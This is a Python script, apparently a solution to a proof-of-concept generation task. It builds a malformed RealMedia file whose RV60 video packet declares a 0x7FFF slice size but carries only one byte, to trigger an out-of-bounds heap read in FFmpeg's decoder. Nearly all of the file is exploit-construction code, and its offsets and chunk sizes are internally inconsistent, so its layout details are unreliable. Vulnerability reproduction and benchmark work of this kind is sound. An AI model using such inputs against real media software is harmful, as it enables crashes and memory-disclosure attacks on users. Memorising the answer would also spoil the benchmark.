import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a heap buffer
        overflow in the FFmpeg RV60 decoder.

        The vulnerability exists because the decoder fails to validate the slice
        size read from the media packet against the actual packet buffer size.
        By providing a packet with a header indicating a large slice size but
        containing very little actual data, we can cause the decoder's bitstream
        reader to read past the end of the allocated buffer.

        The PoC is a minimal but structurally valid RealMedia (.rm) file:
        1.  RMF Header: Standard file header.
        2.  PROP Chunk: Global file properties.
        3.  MDPR Chunk: Describes the RV60 video stream.
        4.  DATA Chunk: Contains the media packet(s).
        5.  Media Packet: A single packet with a malicious payload. The payload
            starts with a large 16-bit size (0x7FFF), followed by only one
            byte of data. This mismatch triggers the out-of-bounds read.
        """
        def p32(n): return struct.pack('>I', n)
        def p16(n): return struct.pack('>H', n)
        def p8(n): return struct.pack('>B', n)

        poc = b''

        # .RMF Header (14 bytes)
        poc += b'.RMF'
        poc += p32(0)  # Total header size (placeholder, patched later)
        poc += p16(0)  # File version
        poc += p32(3)  # Number of headers (PROP, MDPR, etc.)

        # PROP Chunk (File Properties) (46 bytes)
        prop_chunk = b'PROP'
        prop_chunk += p32(46)       # Chunk size
        prop_chunk += p16(0)        # Version
        prop_chunk += p32(0) * 2    # Max/Avg bit rates
        prop_chunk += p32(1500) * 2 # Max/Avg packet sizes
        prop_chunk += p32(1)        # Num packets
        prop_chunk += p32(1000)     # Duration
        prop_chunk += p32(0)        # Preroll
        prop_chunk += p32(0)        # Index offset
        prop_chunk += p32(0)        # Data offset (placeholder, patched later)
        prop_chunk += p16(1)        # Num streams
        prop_chunk += p16(0)        # Flags
        poc += prop_chunk

        # MDPR Chunk (Media Properties)
        mdpr_chunk_body = b''
        mdpr_chunk_body += p16(0)    # Version
        mdpr_chunk_body += p16(0)    # Stream number
        mdpr_chunk_body += p32(0)    # max_bit_rate
        mdpr_chunk_body += p32(0)    # avg_bit_rate
        mdpr_chunk_body += p32(1500) # max_packet_size
        mdpr_chunk_body += p32(1500) # avg_packet_size
        mdpr_chunk_body += p32(0)    # start_time
        mdpr_chunk_body += p32(0)    # preroll
        mdpr_chunk_body += p32(1000) # duration
        mdpr_chunk_body += p8(0)     # stream_name_len
        
        # Using a shorter mime type to reduce PoC size, as seen in other samples.
        mime_type = b'video/x-pn-r'
        mdpr_chunk_body += p8(len(mime_type))
        mdpr_chunk_body += mime_type
        
        # Type-specific data for RV60 codec
        type_specific_data = b'VIDO'   # Video chunk magic
        type_specific_data += b'RV60'  # Codec FourCC
        type_specific_data += p16(320) # Width
        type_specific_data += p16(240) # Height
        type_specific_data += p16(12)  # Bits per pixel
        type_specific_data += b'\x00' * 16 # Padding to a common length of 26 bytes
        
        mdpr_chunk_body += p32(len(type_specific_data))
        mdpr_chunk_body += type_specific_data
        
        mdpr_chunk = b'MDPR' + p32(4 + 4 + len(mdpr_chunk_body)) + mdpr_chunk_body
        poc += mdpr_chunk

        # Patch offsets now that header block is complete
        data_offset = len(poc)
        # Patch data_offset in PROP chunk (absolute offset 44)
        poc = poc[:44] + p32(data_offset) + poc[48:]
        # Patch total header_size in RMF header (absolute offset 4)
        poc = poc[:4] + p32(data_offset) + poc[8:]

        # DATA Chunk Header (16 bytes)
        poc += b'DATA'
        poc += p32(0)  # Chunk payload size (placeholder, patched later)
        poc += p32(1)  # Num packets in chunk
        poc += p32(0)  # Next DATA chunk offset

        data_payload_start = len(poc)

        # Malicious Media Packet
        # Payload: 2-byte large size + 1 byte of data
        payload = p16(0x7FFF) + b'\x00'
        packet_len = 12 + len(payload) # 12-byte header + payload
        
        packet = b''
        packet += p16(0)         # Version
        packet += p16(packet_len)# Total packet length
        packet += p16(0)         # Stream number
        packet += p32(0)         # Timestamp
        packet += p8(0)          # Packet group
        packet += p8(2)          # Flags (keyframe)
        packet += payload
        
        poc += packet

        # Patch the DATA chunk's payload size
        data_payload_size = len(poc) - data_payload_start
        data_chunk_size_offset = data_offset + 4
        poc = poc[:data_chunk_size_offset] + p32(data_payload_size) + poc[data_chunk_size_offset + 8:]
        
        return poc